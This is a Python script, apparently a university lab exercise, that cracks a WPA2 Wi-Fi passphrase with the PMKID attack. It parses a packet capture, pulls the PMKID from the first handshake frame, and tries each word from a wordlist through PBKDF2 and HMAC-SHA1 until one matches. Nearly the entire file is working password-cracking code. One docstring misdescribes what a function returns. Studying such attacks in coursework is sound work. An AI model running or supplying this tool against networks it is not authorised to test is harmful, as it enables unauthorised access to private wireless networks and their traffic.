#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Find the passphrase from the PMKID info
"""

__author__ = "Robin Müller et Stéphane Teixeira Carvalho"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex

from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import *

from pbkdf2 import *
import hmac, hashlib

"""
To make this script work, scappy 2.4.3 needs to be installed with the command : pip install scapy==2.4.3
We decided to use this version because it offers a clean way to go through packets that were removed 
in the latest versions.
"""

def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def getAssociationRequestInfo(packets):
    """
    Will get all the useful values from an association request packet
    :param packets: the list of packets to analyse
    :return: the ssid of the AP, the MAC of the AP and the Client
    """
    # Search for an association request in the list of packets
    assocRequests = list(filter(lambda pkt: pkt.haslayer(Dot11AssoReq), packets))
    # Exception if we do not find any association request
    if len(assocRequests) == 0:
        raise Exception("Cannot find association request")

    # Retrieve info from the first association request found
    pkt = assocRequests[0]
    # info will give the ssid of the AP
    ssid = pkt.info.decode('ascii')
    # addr1 is where the MAC of the AP is stored in the first association request in our case
    APmac = a2b_hex(pkt.addr1.replace(':', ''))
    # addr2 is where the MAC of the client is stored in the first association request in our case
    Clientmac = a2b_hex(pkt.addr2.replace(':', ''))
    return ssid, APmac, Clientmac


def getHandshakeInfo(APmac, Clientmac, packets):
    """
    Will get the PMKID from the first message of the 4 way handshake
    Handshake packets must be in order.
    :param APmac: the mac address of the access point
    :param Clientmac: the mac address of the client
    :param packets: the list of packets
    :return: the authenticator nonce, the supplicant nonce, the mic of the fourth message and the data of the fourth message
    """
    # Search for all the packets that have the layer WPA_key (This will return the 4 way handshake packets)
    # and that have the same client mac as destination and the mac address of the access point as source
    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key) and
                                   a2b_hex(pkt.addr1.replace(':', '')) == Clientmac and
                                   a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
    # Get the WPA_layer of the packets found contains the value of the handshake
    handshakePkts = list(map(lambda pkt: pkt.getlayer(WPA_key), pkts))
    # The PMID are the last 16 bytes of the content of the wpa_key in scapy
    pmkid = handshakePkts[0].wpa_key[-16:]
    return pmkid

def main():
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("PMKID_handshake.pcap")

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
    pmkid = getHandshakeInfo(APmac, Clientmac, wpa)
    pmk_name = b"PMK Name"  # this string is used in the pseudo-random function

    print("\n\nValues used to derivate keys")
    print("============================")
    print("SSID: ", ssid, "\n")
    print("AP Mac: ", b2a_hex(APmac), "\n")
    print("Client Mac: ", b2a_hex(Clientmac), "\n")
    print("PMKID: ", pmkid.hex(), "\n")

    # Encode the ssid as bytes
    ssid = str.encode(ssid)

    print("\nTrying to find passphrase")
    print("============================")
    # Read from the wordlist
    f = open('./wordlist.txt', 'r')
    # Read each line of the file. The line read will be the passphrase to test
    for passPhrase in f.read().splitlines():
        # Encode the passphrase
        passPhrase = str.encode(passPhrase)
        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
        # Calculate the pmkid
        pmkid_test = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
        # The sha-1 algorithm as 20 bytes as outputs but PMKID is only 16 bytes long
        # So we only take the first 16 bytes
        if pmkid == pmkid_test.digest()[:16]:
            print("Working passphrase     : ", passPhrase.decode())
            break
        else:
            print("Not working passphrase : ", passPhrase.decode())


if __name__ == "__main__":
    main()
